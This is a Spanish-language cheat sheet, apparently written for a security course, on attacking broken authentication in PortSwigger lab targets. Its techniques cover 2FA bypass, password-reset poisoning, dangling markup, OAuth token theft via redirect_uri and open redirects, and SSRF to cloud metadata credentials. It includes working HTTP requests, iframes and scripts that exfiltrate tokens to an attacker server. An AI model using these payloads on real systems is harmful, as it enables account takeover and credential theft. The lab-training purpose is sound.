---
title: Autenticación defectuosa
description: Resumen rápido de comandos esenciales para realizar ataques de autenticación.
layout: academia_lesson
parent: /academia/ciberseguridad/cheatsheets/auditorias-web/documentacion/vulnerabilidades-de-autenticacion/
author: ElStitchMalo
date: 16/12/2025
updated:
tags: [autenticacion]
---

## MFA mal implementado

### Acceso a endpoints para usuarios autenticados sin completar el 2FA

Comprobar si tras validar usuario y contraseña se puede acceder a recursos protegidos sin completar el segundo factor.

1. Login válido (primer factor)

    Credenciales:

    `carlos:montoya`

    La aplicación redirige al paso de verificación 2FA.

2. NO completar el 2FA

    No introducir el código de verificación.

3. Acceso directo a endpoints protegidos

    Probar acceso manual a endpoints autenticados:

    ~~~
    /my-account?id=carlos
    ~~~

### Modificar valores de sesión antes de completar el 2FA

Comprobar si el usuario asociado al segundo factor puede modificarse manipulando cookies o parámetros de sesión.

1. Login válido (primer factor)

    Tras un login correcto, el servidor redirige al segundo factor y envía cookies de estado:

    ~~~
    GET /login2 HTTP/2
    ...
    Cookie: verify=wiener; session=3zIt1C4WU6q61I9SaZ4u5rWbHZA7K79f
    ~~~

2. Modificar el identificador del usuario a verificar

    Cambiar el valor de la cookie `verify` por otro usuario válido:

    ~~~
    GET /login2 HTTP/2
    ...
    Cookie: verify=carlos; session=3zIt1C4WU6q61I9SaZ4u5rWbHZA7K79f
    ~~~

    Esto provoca que el código 2FA se envíe al usuario especificado.

3. Fuerza bruta del código 2FA sobre el usuario objetivo

    Enviar el código 2FA manteniendo el valor `verify` del usuario atacado:

    ~~~
    POST /login2 HTTP/2
    Cookie: verify=carlos; session=gdLJG8pFfGTpc3Ocgf8szzr2UmFQQ6CY
    ...

    mfa-code=$FUZZ$
    ~~~

## Reset de contraseña inseguro

### No se valida el token de restablecimiento

1. Solicitar el restablecimiento de contraseña para nuestra propia cuenta. 
    
    (El sistema nos envía un enlace legítimo con un token)

2. Recibimos por correo una URL con un token de restablecimiento.

3. Al enviar el formulario con la nueva contraseña, interceptamos la petición.

    Observamos que se envían:

    -  el token

    - el nombre de usuario

    - la nueva contraseña

4. El servidor no valida que el token pertenezca a ese usuario. Si cambiamos el valor de username por otro usuario, se restablece su contraseña.

    ~~~
    POST /forgot-password?temp-forgot-password-token=x0ybffizjxin4tmco0b9bjnro7f6ry9q HTTP/2
    ...
    temp-forgot-password-token=x0ybffizjxin4tmco0b9bjnro7f6ry9q&username=carlos&new-password-1=Admin123&new-password-2=Admin123
    ~~~

### Envenenamiento de restablecimiento de contraseña

1. Solicitar el restablecimiento de contraseña para la cuenta objetivo.

    (El sistema enviará un enlace con un token)

2. Interceptar la petición y modificar el encabezado `Host` o añadir el encabezado `X-Forwarded-Host`.
    
    Esto provoca que el enlace de restablecimiento apunte a nuestro servidor malicioso, donde capturaremos el token cuando el usuario abra el email.

    ~~~
    POST /forgot-password HTTP/2
    Host: 0a4400b9042849bd800158d000100014.web-security-academy.net
    Cookie: session=up0HdG0NiGC8EvuoCopzaqCvH7MuR6nO
    X-Forwarded-Host: exploit-0afd00f2042849b880d3571101030020.exploit-server.net
    ...

    username=carlos
    ~~~

3. Solicitar el restablecimiento de contraseña para nuestra propia cuenta.

    (Necesitamos acceso a un formulario válido de restablecimiento)

4. Abrir el enlace de restablecimiento de nuestra cuenta, pero reemplazar el token por el token interceptado de la víctima. 

~~~
GET /forgot-password?temp-forgot-password-token=xy2iacji9fniwd7b55qawxxj4jhq104d HTTP/2
~~~

5. Restablecer la contraseña.

    (La aplicación acepta el token robado y cambia la contraseña de la víctima)

#### Envenenamiento por restablecimiento de contraseña mediante marcado colgante

1. Solicitar reset de contraseña

    -  Solicitar un reset para nuestro propio usuario.
    - Objetivo: ver cómo se construye el correo de reset.

2. Revisar el email recibido

    - El correo no usa token en la URL, envía la nueva contraseña directamente en el cuerpo.
    - El enlace del correo apunta solo a `/login`.

3. Analizar el renderizado del correo

    - Revisar la respuesta `GET /email`.
    - El HTML del correo pasa por DOMPurify antes de renderizarse.
    - Importante: la versión “raw” del correo NO está sanitizada.

4. Ver el correo en formato HTML sin procesar

    - En el cliente de correo, visualizar el email como HTML original.
    - Aquí es donde se reflejará cualquier inyección.

5. Probar manipulación del header Host

    - Cambiar el dominio rompe el servidor
    - Pero, añadir un puerto no numérico funciona:

    ~~~
    Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
    ~~~

6. Inyectar dangling markup

    - Enviar otra vez la solicitud de reset de contraseña, especificando el usuario objetivo y usando el puerto para romper la cadena HTML:

        ~~~
        POST /forgot-password HTTP/2
        Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
        ...
        csrf=FKnzYUTdJNEoCjLJZJ9ZSrt50n2gbUlC&username=carlos
        ~~~

    - Objetivo: hacer que el resto del correo se cargue desde tu servidor.

7. Capturar la contraseña

    - Capturar la contraseña en los log de nuestro servidor malicioso.

8. Iniciar sesión

## Cambio de contraseña inseguro

### Nombre de usuario controlable por el cliente / Confianza en campos ocultos

En el formulario de cambio de contraseña se introduce una contraseña actual incorrecta junto con dos contraseñas nuevas diferentes, de forma que el servidor valide primero la contraseña actual y no bloquee la petición por las nuevas contraseñas.

Se intercepta la solicitud:

~~~
POST /my-account/change-password HTTP/2
...

username=wiener&current-password=monkey&new-password-1=123&new-password-2=098

~~~

El parámetro `username` se modifica por el usuario objetivo, ya que el servidor confía en este valor enviado por el cliente.

A partir de aquí, se realiza fuerza bruta sobre el parámetro `current-password`.

El comportamiento del servidor confirma el ataque:

- `Current password is incorrect` → contraseña incorrecta

- `New passwords do not match` → contraseña correcta

## OAuth

### Implementación incorrecta del tipo de concesión implícita

1. Iniciar sesión vía OAuth normalmente  
    → El navegador recibe un `access_token`.

2. El frontend consulta `GET /me`  
    → Obtiene la información básica del usuario desde el proveedor OAuth.

3. El frontend envía `POST /authenticate`  
    → Manda al backend los datos del usuario junto con el `access_token`.

4. Interceptar la petición `POST /authenticate`  
    → El backend aún no ha validado nada.

5. Modificar los campos del usuario  
    → Cambiar `username`, `email`, etc. por los del usuario objetivo  
    → Dejar el `access_token` intacto.

6. Reenviar la petición alterada

7. Sesión iniciada como el usuario objetivo  
    → El backend confía en los datos del cliente y no correlaciona el token

### Ausencia del parámetro `state`

1. Iniciar sesión normal en el blog (login clásico)

2. Click en “Adjuntar perfil social”
    
    → Completar OAuth con tu cuenta social.

3. En Burp → HTTP history, localizar:

    `GET /auth?client_id=...&redirect_uri=/oauth-linking`   
    → No hay `state` (vulnerable a CSRF).

4. Activar Intercept y repetir Adjuntar perfil social.

5. Interceptar:  
    
    `GET /oauth-linking?code=XXXX`

6. Copiar URL y **descartar** la request  
 
   → El `code` sigue siendo válido.

7. Cerrar sesión del blog.

8. Crear exploit (iframe):

    ~~~
    <iframe src="https://LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
    ~~~

9. Enviar exploit a la víctima (admin)

    → Su navegador vincula tu cuenta social a su cuenta.

10. Volver al blog → Login con redes sociales

    → Acceso como admin.

### Validación de redirect_uri defectuosa

1. Redirigir el tráfico por Burp y hacer clic en “Mi cuenta”.
    
    → Iniciar el flujo OAuth nos permite observar las peticiones reales.

2. Completar el login con OAuth y vuelver al blog.
    
    → Se crea una sesión válida asociada a nuestra cuenta.

3. Cerrar sesión y vuelver a iniciar sesión.

    → El proveedor OAuth aún tiene sesión activa, así que el flujo será automático (sin credenciales).

4. En Burp → Proxy → HTTP history, localizar:
    
    `GET /auth?client_id=...`  
    → Esta es la petición de autorización que inicia OAuth.

5. Observar que al enviar esta request:
   
    → El proveedor redirige inmediatamente a `redirect_uri`  
    → El authorization code viaja en la URL.

6. Enviar la request `GET /auth?...` a Burp Repeater.
    
    → Para manipular el parámetro `redirect_uri` y probar validaciones.

7. En Repeater, cambiar `redirect_uri` por cualquier valor.
    
    → No hay error → el proveedor no valida el destino del código.

8. Cambiar el `redirect_uri` para que apunte al servidor de exploits y envía la request.

    → Esto fuerza que el código OAuth se envíe a un dominio controlado por nosotros.

9. Seguir la redirección y revisar el access log del servidor de exploits.
    
    → Confirmar que el `code` se está filtrando externamente.

10. En el servidor de exploits, crear el siguiente iframe en `/exploit`:

    ~~~
    <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
    ~~~

    → El iframe dispara el flujo OAuth automáticamente en el navegador de la víctima.

11. Guardar el exploit y hacer clic en “View exploit”.
    
    → Verificar que el código vuelve a filtrarse correctamente.

12. Entregar el exploit a la víctima (admin).
    
    → Su navegador ejecuta OAuth y envía su authorization code a nuestro servidor.

13. Copiar el `code` de la víctima desde los logs.
    
    → El código representa una autenticación válida del admin.

14. Cerrar sesión del blog y navegar a:

    ~~~
    https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
    ~~~
    → Canjear el código robado

### Ataque de redirecciones abiertas en otros puntos de la página

1. Identificar el flujo OAuth

    - Iniciar sesión con OAuth usando Burp Proxy.
    - Observar la petición:

    ~~~
    GET /auth?client_id=...&redirect_uri=...
    ~~~

    Confirmar:

    - redirect_uri está limitado a dominio en whitelist
    - No acepta dominios externos

2. Probar manipulación del `redirect_uri`
    
    - En Repeater, añadir directory traversal al `redirect_uri`:
    
    ~~~
    /oauth-callback/../post?postId=1
    ~~~

    - Si el backend normaliza la ruta:

        - El redirect funciona
        - El navegador acaba en `/post`
    
    - Resultado clave:

        - El token OAuth aparece en el fragmento (#access_token=...)

3. Buscar una redirección abierta interna

    - Auditar páginas accesibles desde el nuevo `redirect_uri`
    - Encuentrar:

    ~~~
    GET /post/next?path=...
    ~~~

    - Comprobar en Repeater:

        - `path` acepta URLs absolutas
        - Redirige a dominios externos → open redirect confirmado

4. Encadenar vulnerabilidades (core del ataque)

    Objetivo:
    OAuth → redirect_uri con traversal → open redirect → servidor del atacante

    Payload final:

    ~~~
    https://oauth-OAUTH-ID.oauth-server.net/auth
    ?client_id=CLIENT-ID
    &redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://EXPLOIT-ID.exploit-server.net/exploit
    &response_type=token
    &scope=openid profile email
    ~~~

    - Al visitar la URL:

        - El token llega al servidor del exploit en el fragmento

5. Exfiltrar el token (fragment → query)

    Script mínimo en `/exploit`:
    
    ~~~
    <script>
    window.location = '/?' + document.location.hash.substr(1)
    </script>
    ~~~

    - El navegador hace:

    ~~~
    GET /?access_token=...
    ~~~

    - El token queda registrado en los access logs

6. Exploit automático para la víctima

    Script final:

    ~~~
    <script>
    if (!document.location.hash) {
    window.location = 'https://oauth-OAUTH-ID.oauth-server.net/auth?...'
    } else {
    window.location = '/?' + document.location.hash.substr(1)
    }
    </script>
    ~~~

    - Fuerza el login OAuth
    - Captura el token sin interacción adicional

7. Usar el token robado

    - Copiar el `access_token`
    - En Repeater, reutilizar:

    ~~~
    GET /me
    Authorization: Bearer <token_víctima>
    ~~~

## OAuth

### SSRF en OpenID

1. Localizar endpoints OpenID Connect

    1. Interceptar el tráfico con Burp.

    2. Iniciar sesión normalmente en la aplicación.

    3. Acceder al archivo de configuración OpenID:

    ~~~
    https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
    ~~~

    4. Identifica el endpoint de registro dinámico:

    ~~~
    "registration_endpoint": "/reg"
    ~~~

2. Registrar una aplicación cliente sin autenticación

    En Burp Repeater, crear una petición POST al endpoint de registro.

    Solo es obligatorio incluir `redirect_uris`.

    ~~~
    POST /reg HTTP/1.1
    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
    Content-Type: application/json

    {
    "redirect_uris": [
        "https://example.com"
    ]
    }
    ~~~

    Enviar la solicitud  

    Si funciona sin autenticación, el endpoint es vulnerable.

    Guardar el client_id de la respuesta.

3. Confirmar que el proveedor carga el logo del cliente

    1. Observar el flujo OAuth en Burp.

    2. Identificar que la página “Authorize” muestra un logo.

    3. El logo se obtiene desde:

        ~~~
        GET /client/CLIENT-ID/logo
        ~~~

        Enviar esta solicitud en Repeater usando tu `client_id`.

4. Verificar SSRF usando Burp Collaborator

    1. Vuelver a la `POST /reg`.

    2. Añadir la propiedad `logo_uri`.

    3. Usar Insert Collaborator Payload como valor.

        ~~~
        POST /reg HTTP/1.1
        Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
        Content-Type: application/json

        {
        "redirect_uris": [
            "https://example.com"
        ],
        "logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"
        }
        ~~~
    
    4. Enviar la solicitud y copiar el nuevo `client_id`.

    5. Solicitar el logo del nuevo cliente:

    ~~~
    GET /client/NEW-CLIENT-ID/logo
    ~~~

    6. Revisar Burp Collaborator.

5. Explotar SSRF para acceder a metadata interna (cloud)

    Reemplaza el `logo_uri` por la IP interna de metadata (AWS):

    ~~~
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
    ~~~

    1. Enviar la `POST /reg`.

    2. Copiar el nuevo `client_id`.

    3. Solicitar:

        ~~~
        GET /client/CLIENT-ID/logo
        ~~~

        La respuesta devuelve credenciales internas del proveedor OAuth
